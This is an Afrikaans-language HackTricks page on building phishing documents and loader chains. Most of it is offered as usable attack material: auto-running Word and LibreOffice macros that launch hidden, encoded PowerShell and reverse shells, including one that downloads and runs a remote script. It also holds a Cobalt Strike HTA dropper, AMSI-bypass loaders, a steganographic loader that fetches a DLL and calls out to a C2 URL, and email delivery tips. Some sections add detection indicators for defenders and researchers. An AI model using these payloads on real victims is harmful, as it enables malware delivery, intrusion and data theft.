# Phishing-lêers en -dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word voer lêerdatavalidering uit voordat ’n lêer oopgemaak word. Datavalidering word uitgevoer in die vorm van datastruktuuridentifikasie, volgens die OfficeOpenXML-standaard. Indien enige fout tydens die datastruktuuridentifikasie voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul vermoë om macros uit te voer, te behou.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie macros nie, volgens ontwerp, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en in staat wees om macros uit te voer.\
Dieselfde interne strukture en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na ’n remote template verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros insluit, kan macros ook “execute”.

### External Image Load

Gaan na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Field names**: includePicture, en **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Gaan na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Dit is moontlik om macros te gebruik om arbitrêre code vanuit die document uit te voer.

#### Autoload functions

Hoe meer algemeen hulle is, hoe waarskynliker is dit dat die AV hulle sal detecteer.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc Extension

Wanneer jy klaar is, kies die **Save as type**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
Doen dit omdat jy **nie macro's binne 'n `.docx` kan stoor nie** en daar 'n **stigma** **rondom** die macro-enabled **`.docm`**-extension is (die thumbnail-ikoon het byvoorbeeld 'n groot `!`, en sommige web-/e-mailgateways blokkeer dit heeltemal). Daarom is hierdie **legacy `.doc` extension die beste kompromie**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer-dokumente kan Basic-macros insluit en dit outomaties uitvoer wanneer die lêer oopgemaak word deur die macro aan die **Open Document**-event te bind (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-macro lyk soos volg:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, sodat payloads wat met `...==""")` eindig, beide die binneste opdrag en die Shell-argument gebalanseerd hou.

Afleweringswenke:

- Stoor as `.odt` en koppel die macro aan die dokumentgebeurtenis sodat dit onmiddellik uitgevoer word wanneer dit oopgemaak word.
- Wanneer jy met `swaks` e-pos stuur, gebruik `--attach @resume.odt` (die `@` is nodig sodat die lêergrepe, en nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is krities wanneer SMTP-servers misbruik word wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

’n HTA is ’n Windows-program wat **HTML en scripting languages (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en voer as ’n “fully trusted”-toepassing uit, sonder die beperkings van ’n blaaier se sekuriteitsmodel.

’n HTA word uitgevoer met **`mshta.exe`**, wat tipies saam met **Internet Explorer** geïnstalleer is, wat **`mshta` afhanklik van IE** maak. As dit dus gedeïnstalleer is, sal HTAs nie kan uitvoer nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Daar is verskeie maniere om **NTLM authentication "remotely" te forceer**, byvoorbeeld deur **invisible images** by e-posse of HTML te voeg wat die gebruiker sal access (selfs HTTP MitM?). Of stuur die slagoffer die **address van files** wat **authentication** sal **trigger** bloot deur die **folder** oop te maak.

**Check hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die authentication kan steal nie, maar ook **NTLM relay attacks kan uitvoer**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hoogs effektiewe veldtogte lewer ’n ZIP wat twee legitieme decoy-dokumente (PDF/DOCX) en ’n malicious .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se raw bytes ná ’n unique marker gestoor word, en die .lnk dit carve en volledig in memory uitvoer.<sup>[[2]](#references)</sup>

Tipiese flow wat deur die .lnk PowerShell one-liner geïmplementeer word:

1) Locateer die oorspronklike ZIP in algemene paths: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die parent van die huidige working directory.
2) Lees die ZIP bytes en vind ’n hardcoded marker (bv. xFIQCV). Alles ná die marker is die embedded PowerShell payload.
3) Copy die ZIP na %ProgramData%, extract dit daar, en open die decoy .docx om legitiem voor te kom.
4) Bypass AMSI vir die huidige process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate die volgende stage (bv. remove alle #-characters) en execute dit in memory.

Voorbeeld van ’n PowerShell skeleton om die embedded stage te carve en uit te voer:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- Delivery abuses dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads beperk (bedien onskadelike ZIP-lêers gebaseer op IP/UA).
- Die volgende stadium dekripteer gereeld base64/XOR-shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfspore te minimaliseer.

Persistence wat in dieselfde ketting gebruik word
- COM TypeLib-hijacking van die Microsoft Web Browser-beheer sodat IE/Explorer of enige toepassing wat dit inbed, die payload outomaties herbegin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Opsporing/IOCs
- ZIP-lêers wat die ASCII-merkerstring (bv. xFIQCV) bevat wat aan die argiefdata geheg is.
- .lnk wat ouer-/gebruikersvouers opsom om die ZIP op te spoor en ’n lokdokument oop te maak.
- AMSI-peutering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende besigheidsdrade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.

## LNK-lokmiddel-eerste staging → scheduled-task-persistence → trusted CPL-side-loading

Nog ’n herhalende patroon is ’n **dokument-nabootsende `.lnk`** wat onmiddellik ’n onskadelike lokmiddel oopmaak terwyl dit die werklike ketting op die agtergrond voorberei.<sup>[[3]](#references)</sup>

Waargenome werkvloei:
1. Die shortcut **doen hom voor as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke proxy om ’n geobfuskeerde PowerShell-downloader te begin.
2. Die PowerShell fragmenteer ooglopende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe opsporing wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag mis.
3. Die stager laai eers die **lokdokument** af, maak dit vir die slagoffer oop en rekonstrueer daarna die kwaadwillige lêers op die agtergrond.
4. Payloads kan met **waardelose uitbreidings** geskryf en daarna hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe`-/`.cpl`-artefakte vertraag.
5. Persistence word bewerkstellig met ’n **minute-gebaseerde scheduled task** wat ’n vertroude host-binêre lêer vanaf ’n pad skryfbaar deur die gebruiker begin.

Minimale opsporingsaanwysings uit hierdie patroon:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
'n Nuttige staging-uitleg om te herken, is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` of `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stadium stealthy is

In die Rapid7-gevallestudie het die scheduled task herhaaldelik **`Fondue.exe`** vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan gestage is en **`RunFODW`** geëksporteer het, het die vertroude Microsoft-binêre lêer die aanvaller se CPL gelaai in plaas van die wettige stelselweergaw.

Die CPL:
- Lees 'n **AES-256-CBC**-blob vanaf `C:\Windows\Tasks\editor.dat`
- Decrypt dit deur **Windows CNG / `bcrypt.dll`**
- Ken uitvoerbare geheue toe en kopieer die gedekripteerde shellcode
- Voer dit indirek uit deur die shellcode-wyser as die callback vir **`EnumUILanguagesW`** deur te gee

Daardie laaste stap is afsonderlik die moeite werd om te hunt: malware vermy dikwels 'n direkte `((void(*)())buf)()`-sprong en misbruik eerder 'n **legitimate callback-taking WinAPI** om uitvoering oor te dra.

Die gedekripteerde payload in hierdie veldtog was **Donut**-shellcode, wat daarna die finale PE volledig in geheue gemap het en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat uitvoering oorgegee is. Vir meer gedetailleerde notas oor side-loading en memory-resident post-processing, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese hunting-pivots:
- `.lnk` wat `powershell.exe` of `conhost.exe` spawn, gevolg deur 'n sigbare decoy-dokument.
- Kortstondige downloads na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf nonsensuitbreidings.
- Scheduled tasks met onopvallende name soos `GoogleErrorReport` wat vanaf **user-writable directories** uitgevoer word.
- Vertroude binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en daarna deur die side-loaded module gelees word.

## Steganography-delimited payloads in beelde (PowerShell stager)

Onlangse loader chains lewer 'n obfuscated JavaScript/VBS wat 'n Base64 PowerShell stager dekodeer en uitvoer. Daardie stager download 'n beeld (dikwels GIF) wat 'n Base64-geënkodeerde .NET DLL bevat wat as gewone teks tussen unieke begin- en eindmerkers versteek is. Die script soek hierdie delimiters (voorbeelde wat in die wild gesien is: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die teks tussenin, dekodeer dit met Base64 na bytes, laai die assembly in-memory en roep 'n bekende entry method met die C2-URL aan.<sup>[[5]](#references)</sup>

Werkvloei
- Stadium 1: Geargiveerde JS/VBS-dropper → dekodeer ingebedde Base64 → loods PowerShell stager met -nop -w hidden -ep bypass.
- Stadium 2: PowerShell stager → download beeld, sny marker-delimited Base64 uit, laai die .NET DLL in-memory en roep sy method aan (bv. VAI) met die C2-URL en opsies.
- Stadium 3: Loader haal die finale payload op en inject dit tipies via process hollowing in 'n vertroude binêre lêer (gewoonlik MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Sien meer oor process hollowing en trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om 'n DLL uit 'n beeld te carve en 'n .NET-method in-memory aan te roep:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Dit is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
- AMSI/ETW bypass en string-deobfuskasie word algemeen toegepas voordat die assembly gelaai word.
- Opsporing: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell wat toegang tot beelde verkry en Base64-blobs onmiddellik dekodeer.

Sien ook stego tools en carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

'n Herhalende aanvanklike stadium is 'n klein, sterk-geobfuskeerde `.js`- of `.vbs`-lêer wat binne 'n argief afgelewer word. Die enigste doel daarvan is om 'n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te inisieer.<sup>[[5]](#references)</sup>

Skematiese logika (abstrak):
- Lees die eie lêer se inhoud
- Vind 'n Base64-blob tussen rommelstringe
- Dekodeer na ASCII PowerShell
- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` oproep

Opsporingsaanwysers
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die command line.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker se tydelike paaie begin.

## Windows files to steal NTLM hashes

Kyk na die bladsy oor **plekke om NTLM creds te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-veldtog: 'n Gesofistikeerde Phishing-aanval gerig op Amerikaanse maatskappye](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Nasporing van Dropping Elephant Tradecraft deur 'n China-tema Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuwe COM-persistentietegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader lewer 'n reeks Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
